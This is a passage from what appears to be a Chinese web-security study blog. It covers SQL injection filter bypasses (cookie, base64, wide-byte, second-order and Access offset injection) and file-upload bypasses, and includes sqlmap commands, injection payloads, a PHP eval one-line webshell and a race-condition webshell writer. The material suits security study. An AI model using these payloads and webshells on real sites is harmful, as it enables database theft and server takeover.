1&#x3D;1</span><br><span class="line">OrdER </span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">如果过滤机制设置出现关键字之后替换为空，则可以利用双写绕过。</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">利用URL在线编码，绕过SQL注入的过滤机制。</span><br><span class="line">站长之家在线编码</span><br><span class="line"></span><br><span class="line">4.内联注释绕过</span><br><span class="line">&#x2F;!*select*&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.关于cookie</span><br><span class="line">服务器可以利用cookie包含信息的任意性来判断在HTTP传输中的状态。</span><br><span class="line">Cookie最典型的应用是判定注册用户是否已经登录网站，另一个是购物车处理，用户在不同的页面选择不同的商品，这些信息都会写入cookie，以便在最后付款时提取信息。</span><br><span class="line">在浏览器中，调试工具中输入document.cookie可查看当前的cookie值</span><br><span class="line"></span><br><span class="line">2.cookie注入</span><br><span class="line">代码中使用cookie传递参数，但是没有对Cookie中传递的参数进行过滤，导致SQL注入漏洞产生。</span><br><span class="line">&#x2F;&#x2F;利用&#39; or 1&#x3D;1 --+输出第一个用户名和密码</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; or 1&#x3D;1 --+; _guid&#x3D;%9999239293_324324</span><br><span class="line">&#x2F;&#x2F;用报错爆当前数据库版本</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)--+ _guid&#x3D;3432432432_343242</span><br><span class="line"></span><br><span class="line">3.使用sqlmap进行cookie注入</span><br><span class="line">sqlmap -r test.txt --level 3 然后在注入位置改为 *</span><br><span class="line">sqlmap -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><h2 id="Cookie-Base64编码注入"><a href="#Cookie-Base64编码注入" class="headerlink" title="Cookie  Base64编码注入"></a>Cookie  Base64编码注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.Base64</span><br><span class="line">Base64编码是从二进制到字符的过程，可用在HTTP环境下传递较长的标识信息。</span><br><span class="line">Base64是比较常见的传输8Bit字节码的编码方式之一，即基于64个可打印字符来表示二进制数据的方法。</span><br><span class="line"></span><br><span class="line">将原始内容转换为二进制，从左到右依次取6位，然后在最高位补两位0，形成新内容。</span><br><span class="line">编码规则：</span><br><span class="line">把3个字符变成4个字符；</span><br><span class="line">每76个字符加一个换行符；</span><br><span class="line">最后的结束符也要处理，结束符一般为&#x3D;&#x3D;。</span><br><span class="line"></span><br><span class="line">2.注入产生原因</span><br><span class="line">base64_decode(str):PHP语言中用于解密Base64解密字符串的函数。</span><br><span class="line"></span><br><span class="line">3.cookie base64注入</span><br><span class="line">base64编码后的admin：YWRtaW4&#x3D;</span><br><span class="line">&quot; or 1&#x3D;1 base64编码：liBvciAxPTEglw&#x3D;&#x3D;</span><br><span class="line">使用base64编码后的注入语句，插入到cookie对应位置进行注入探测</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">python sqlmap.py -r test.txt --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h2 id="过滤注释符注入"><a href="#过滤注释符注入" class="headerlink" title="过滤注释符注入"></a>过滤注释符注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.mysql注释符</span><br><span class="line">注释符作用：用于标记某段代码，起到对代码功能的说明作用，注释掉的内容不会被执行。</span><br><span class="line">单行注释： --+或--空格 或#</span><br><span class="line">多行注释：&#x2F;*多行注释内容*&#x2F;</span><br><span class="line">对于正常的SQL语句，注释符起到说明功能的作用。</span><br><span class="line">在SQL注入过程中，起到闭合单引号、双引号、单括号、多括号的功能。</span><br><span class="line"></span><br><span class="line">2.绕过过滤注释符进行注入</span><br><span class="line">利用注释符不能成功闭合单引号时，可利用or &#39;1&#39;&#x3D;1&#39;闭合单引号等</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;3</span><br></pre></td></tr></table></figure><h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.mysql基础</span><br><span class="line">Mysql中对大小写不敏感，大写与小写一样</span><br><span class="line">十六进制和URL编码的内容mysql可进行正常识别</span><br><span class="line">符号和关键字替换： and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">内联注释与多行注释： &#x2F;*！内联注释*&#x2F;  &#x2F;*多行注释*&#x2F;</span><br><span class="line"></span><br><span class="line">2.绕过过滤and和or的注入</span><br><span class="line">绕过策略：</span><br><span class="line">大小写变形- Or、OR、oR、And、aND等，忽略大写过滤时失效</span><br><span class="line">敏感词汇中添加注释- a&#x2F;**&#x2F;nd  </span><br><span class="line">双写绕过- oorr</span><br><span class="line">利用符号代替- and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+</span><br></pre></td></tr></table></figure><h2 id="绕过过滤空格的sql注入"><a href="#绕过过滤空格的sql注入" class="headerlink" title="绕过过滤空格的sql注入"></a>绕过过滤空格的sql注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.绕过策略：</span><br><span class="line">使用hex、urldecode编码方式：空格URL编码%0a TAB键(水平)%09</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键(垂直)</span><br><span class="line"></span><br><span class="line">2.使用sqlmap进行测试</span><br><span class="line">sqlmap -u &quot;URL&quot; --hex --dbs --batch</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.宽字节</span><br><span class="line">GBK占用两字节</span><br><span class="line">ASCII码占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码，MySQL默认字符集为GBK等宽字节字符集</span><br><span class="line"></span><br><span class="line">%DF:会被PHP的addslashes函数转义为&quot;%DF\&#39;&quot;,&quot;\&quot;即URL编码中的&quot;%5C&quot;,也就是说&quot;%DF&quot;会被转成&quot;%DF%5C%27&quot;。如果网站的字符集为GBK，MySQL使用的编码也是GBK，就会认为&quot;%DF%5C%27&quot;是一个宽字符。也就是&quot;縗&#39;&quot;。单引号就出来了</span><br><span class="line"></span><br><span class="line">2.宽字节sql注入</span><br><span class="line">payload：</span><br><span class="line">id&#x3D;%df&#39; --+  </span><br><span class="line">&#x2F;&#x2F;%DF 闭合前面，--+闭合后面</span><br><span class="line">例子：</span><br><span class="line">xxx.xxx.com&#x2F;？id&#x3D;-1%df&#39; union select 1,user(),version() --+</span><br><span class="line"></span><br><span class="line">3.宽字节注入扩展</span><br><span class="line">最常使用的宽字节注入是利用%df，其实只要第一个ascii码大于128就可以，比如ascii码为129的，就可以。</span><br><span class="line">如何转换为URL编码呢，先将129（十进制）转换为十六进制，也就是0x81，然后在十六进制前加%即可，即%81。</span><br><span class="line">GBK首字节对0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1%81&#39; union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.二阶注入</span><br><span class="line">第一次客户端进行注册，注册信息经网站服务器转给数据库服务器进行存储，第二次进行查询时，将第一次的注册信息作为payload进行查询数据库信息。</span><br><span class="line">update 或set...where username&#x3D;注册用户名</span><br><span class="line"></span><br><span class="line">2.二阶注入利用</span><br><span class="line">注册用户admin&#39;-- -</span><br><span class="line">注册成功后，使用注册的用户登录，修改密码</span><br><span class="line">查看网页源代码，将密码类型改为text</span><br><span class="line">修改密码后发现，已经成功修改了admin的密码</span><br><span class="line"></span><br><span class="line">因为-- 注释掉了后面的passwd，使得直接修改了admin的密码</span><br><span class="line">3.二阶注入的危害</span><br><span class="line">注入payload触发二次SQL注入</span><br><span class="line">注入payload触发XSS攻击</span><br></pre></td></tr></table></figure><h2 id="ASP-Access注入"><a href="#ASP-Access注入" class="headerlink" title="ASP+Access注入"></a>ASP+Access注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.ASP+Access网站技术</span><br><span class="line">ASP是微软公司开发的服务器端脚本环境，可用来创建动态交互网页并建立强大的web应用程序。ASP文件可包含文本、HTML和com组件调用。</span><br><span class="line"></span><br><span class="line">Microsoft office Access是由微软发布的关系数据库管理系统，只有表的概念。</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;xxx.xxx.com&#x2F;xxx.asp?id&#x3D;x&quot; --tables</span><br><span class="line"></span><br><span class="line">2.Access偏移注入</span><br><span class="line">原理：</span><br><span class="line">借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在页面上显示。</span><br><span class="line"></span><br><span class="line">利用场景：</span><br><span class="line">解决知道Access数据库知道表名，但是得不到字段的SQL注入困境。字段名取名复杂，字典暴力破解字段名不成功。</span><br><span class="line"></span><br><span class="line">注入流程：</span><br><span class="line">判断字段数：order by</span><br><span class="line">判断表名：使用union select * from 表名来获取</span><br><span class="line">利用注入公式进行注入</span><br><span class="line"></span><br><span class="line">注入实践：</span><br><span class="line">基本公式为order by出的字段数减去*号的字段数，然后再用order by的字段数减去（上步得出的答案的2倍）。</span><br><span class="line">如18-11&#x3D;7，18-7*2&#x3D;4</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;1.asp?id&#x3D;x union select 1,2,3,4 a.id,b.id, * from(sys_admin as a inner join sys_admin as b on a.id&#x3D;b.id)</span><br><span class="line">&#x2F;&#x2F;这里的union select 1，2，3，4就是刚才的得出来的长度</span><br><span class="line">&#x2F;&#x2F;后面是sql公式</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://yoursite.com/2020/08/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2020/08/01/文件上传/</id>
    <published>2020-08-01T14:29:08.000Z</published>
    <updated>2020-08-01T14:32:13.930Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="绕过前端JS验证的文件上传"><a href="#绕过前端JS验证的文件上传" class="headerlink" title="绕过前端JS验证的文件上传"></a>绕过前端JS验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.Burpsuite去除JS验证</span><br><span class="line">在Burpsuite的Proxy功能项的option下，有一个remove all javascripts选项，勾选上。</span><br><span class="line">或者浏览器直接禁用JS脚本执行。</span><br><span class="line"></span><br><span class="line">2.浏览器审计工具去除JS验证</span><br><span class="line">利用浏览器的审查工具去除JS之后，保存为新文件然后进行文件上传。</span><br><span class="line">打开审查工具界面，找到onsubmit&#x3D;&quot;return checkfile()&quot;</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure><h2 id="绕过MIME-Type验证的文件上传"><a href="#绕过MIME-Type验证的文件上传" class="headerlink" title="绕过MIME-Type验证的文件上传"></a>绕过MIME-Type验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.MIME-Type</span><br><span class="line">MIME：多用途互联网邮件扩展类型。设定某种扩展名的文件用一种应用程序来打开的方式类型，当扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</span><br><span class="line">多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</span><br><span class="line"></span><br><span class="line">常见文件的MIME-Type：</span><br><span class="line">PDF文档.pdf</span><br><span class="line">Microsoft word文件：.word</span><br><span class="line">PNG图像.png  image&#x2F;png</span><br><span class="line">GIF图像.gif  image&#x2F;gif</span><br><span class="line">JPEG图形.jpeg .jpg image&#x2F;jpeg</span><br><span class="line">au声音文件.au  audio&#x2F;basic</span><br><span class="line">MIDI音乐文件mid .midi  audio&#x2F;midi,audio&#x2F;x-midi</span><br><span class="line">RealAudio音乐文件.ra  .ram  audio&#x2F;x-pn-realaudio</span><br><span class="line">MPEG文件.mpg .mpeg  video&#x2F;mpeg</span><br><span class="line">AVI文件 .avi video&#x2F;x-msvideo</span><br><span class="line">用到时浏览器查询即可</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过MIME-Type验证</span><br><span class="line">上传1.php</span><br><span class="line">利用Burpsuite截断HTTP请求，在Repeter(或者中间的content-Type)重放修改MIME-Type类型绕过验证。</span><br><span class="line">修改为符合要求的MIME-Type：image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">3.菜刀连接</span><br><span class="line">上传webshell，菜刀连接</span><br><span class="line">一句话木马：&lt;?php @eval($_POST[&#39;cmd&#39;];?)&gt;</span><br><span class="line">技巧：可通过右键查看上传图片属性，获取上传webshell的地址，进行连接。</span><br></pre></td></tr></table></figure><h2 id="绕过黑名单限制的文件上传"><a href="#绕过黑名单限制的文件上传" class="headerlink" title="绕过黑名单限制的文件上传"></a>绕过黑名单限制的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.基于文件后缀名的验证</span><br><span class="line">分类：</span><br><span class="line">基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功</span><br><span class="line">基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功</span><br><span class="line"></span><br><span class="line">2.Burpsuite绕过验证</span><br><span class="line">先以.jpg等符合的后缀名上传，再使用Burpsuite截断HTTP请求，再修改文件后缀名，或利用intruder模块进行枚举后缀名，寻找黑名单没有过滤的后缀名。</span><br><span class="line">PhP</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">phtml</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure><h2 id="htaccess绕过进行文件上传"><a href="#htaccess绕过进行文件上传" class="headerlink" title=".htaccess绕过进行文件上传"></a>.htaccess绕过进行文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1..htaccess文件</span><br><span class="line">htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。</span><br><span class="line">通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或目录的访问、禁止目录列表、配置默认文档等功能。</span><br><span class="line">其中.htaccess文件内容：</span><br><span class="line">SetHander application&#x2F;x-httpd-php</span><br><span class="line">设置当前目录所有文件都使用PHP解析，那么无论上传任何文件，只要文件内容符合PHP语言代码规范，就会被当作PHP执行。不符合则会报错。</span><br><span class="line"></span><br><span class="line">当在黑名单中，没有对.htaccess进行过滤，可以直接上传.htaccess来设置使用php解析任意文件。文件内容：SetHander application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">2.配置文件http.conf</span><br><span class="line">在Apache中如果需要启动.htaccess，必须在http.conf中设置AllowOverride</span><br><span class="line"></span><br><span class="line">3.制作图片马phpinfo探针并上传</span><br><span class="line">使用文本编辑工具写入phpinfo探针：</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">保存为1.jpg进行上传即可</span><br></pre></td></tr></table></figure><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过原理</span><br><span class="line">windows系统下，对于文件名中的大小写不敏感。例如test.php和test.PhP是一样的。</span><br><span class="line">Linux系统下，对于文件名中的大小写敏感。例如test.php和test.PhP是不一样的。</span><br><span class="line"></span><br><span class="line">2.修改后缀名大小写绕过</span><br><span class="line">直接修改后缀名大小写混合的，进行上传。</span><br><span class="line"></span><br><span class="line">3.WeBaCoo上传webshell</span><br><span class="line">使用WeBaCoo生成webshell：webacoo -g -o a.php</span><br></pre></td></tr></table></figure><h2 id="空格绕过黑名单"><a href="#空格绕过黑名单" class="headerlink" title="空格绕过黑名单"></a>空格绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.空格绕过</span><br><span class="line">window系统下，对于文件中空格会被当作空处理，程序中的检测代码不能自动删除空格，从而绕过黑名单。</span><br><span class="line"></span><br><span class="line">2.绕过验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，对上传的文件名后加空格。</span><br></pre></td></tr></table></figure><h2 id="号绕过黑名单"><a href="#号绕过黑名单" class="headerlink" title=".号绕过黑名单"></a>.号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1..号绕过</span><br><span class="line">windows系统下，文件后缀名最后一个.会被自动去除。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">使用Burpsuite工具截断HTTP请求，上传文件加.绕过上传。</span><br><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure><h2 id="特殊符号绕过黑名单"><a href="#特殊符号绕过黑名单" class="headerlink" title="特殊符号绕过黑名单"></a>特殊符号绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.特殊符号绕过原理：</span><br><span class="line">windows系统下，如果上传的文件名中test.php::$DATA会在服务器中生成test.php文件，内容和所上传文件内容相同，并被解析。</span><br><span class="line"></span><br><span class="line">2.直接上传1.php::$DATA</span><br><span class="line">在Linux下修改文件名为1.php::$DATA进行上传</span><br></pre></td></tr></table></figure><h2 id="路径拼接绕过黑名单"><a href="#路径拼接绕过黑名单" class="headerlink" title="路径拼接绕过黑名单"></a>路径拼接绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.路径拼接绕过原理</span><br><span class="line">服务器没有对用户上传的文件进行重命名的情况下，用户可以自定义文件名，并上传新建，就会造成绕过。</span><br><span class="line"></span><br><span class="line">2.绕过黑名单验证</span><br><span class="line">在Linux下修改文件名，上传1.php..文件</span><br></pre></td></tr></table></figure><h2 id="双写绕过黑名单"><a href="#双写绕过黑名单" class="headerlink" title="双写绕过黑名单"></a>双写绕过黑名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.双写绕过</span><br><span class="line">代码编写过程中，只对黑名单中的内容进行空替换,因为只替换一次造成双写绕过。</span><br><span class="line">phphpp</span><br></pre></td></tr></table></figure><h2 id="00截断绕过白名单"><a href="#00截断绕过白名单" class="headerlink" title="%00截断绕过白名单"></a>%00截断绕过白名单</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.%00截断原理</span><br><span class="line">0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当作结束符。系统在对文件名读取时，如果遇到0x00时，就会认为读取结束。</span><br><span class="line"></span><br><span class="line">在PHP5.3版本之后的已经修复了00截断。并且00截断受限于GPC、addslasher函数。</span><br><span class="line"></span><br><span class="line">2.GET型%00截断</span><br><span class="line">GET型提交的内容会被自动进行URL编码，前提是GPC是关闭的。</span><br><span class="line">在拼接路径后面1.php%00: ..&#x2F;upload&#x2F;1.php%00</span><br><span class="line"></span><br><span class="line">3.POST型%00截断</span><br><span class="line">在POST请求中，%00不会被自动解码，在burpsuite中选择HEX编码形式进行修改00</span><br></pre></td></tr></table></figure><h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.图片马</span><br><span class="line">在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合规范，通过查看文件二进制格式的前几个字节，从而判断文件类型是否正确。</span><br><span class="line">在前面添加GIF98A即可。</span><br><span class="line"></span><br><span class="line">2.上传</span><br><span class="line">在上传过程中可能有content-Type验证，修改为image&#x2F;gif或image&#x2F;jpg,使其符合当前文件类型的MIME-Type.</span><br><span class="line"></span><br><span class="line">3.文件包含漏洞</span><br><span class="line">在PHP中，使用include、require、include_once、require_once函数包含的文件都会被当作PHP代码执行，无论文件的名称是什么，只要文件内容符合PHP代码规范，都会被当作PHP代码执行。</span><br><span class="line"></span><br><span class="line">4.结合文件包含输出phpinfo</span><br><span class="line">利用存在文件包含的PHP页面，包含上传的图片webshell，从而触发webshell，输出相应的phpinfo。</span><br></pre></td></tr></table></figure><h2 id="条件竞争上传"><a href="#条件竞争上传" class="headerlink" title="条件竞争上传"></a>条件竞争上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.文件上传过程</span><br><span class="line">服务器获取文件---&gt;保存上传临时文件---&gt;重命名移动临时文件</span><br><span class="line"></span><br><span class="line">2.条件竞争原理</span><br><span class="line">网站逻辑：</span><br><span class="line">(1)网站允许上传任意文件，然后检查上传文件是否包含webshell，如果包含删除该文件。</span><br><span class="line">(2)网站允许上传任意文件，但如果不是指定类型，使用unlink删除文件。</span><br><span class="line">在删除之前访问上传的php文件，从而执行上传文件中的php代码。</span><br><span class="line"></span><br><span class="line">3.条件竞争上传利用</span><br><span class="line">上传前不断访问代码文件，然后上传。</span><br><span class="line">Python发送http请求：</span><br><span class="line">import requests</span><br><span class="line">while true：</span><br><span class="line">   request.get(&quot;路径&quot;)</span><br><span class="line"></span><br><span class="line">写入webshell：</span><br><span class="line">&lt;?php</span><br><span class="line">fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;])？&gt;&#39;)</span><br></pre></td></tr></table></figure><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 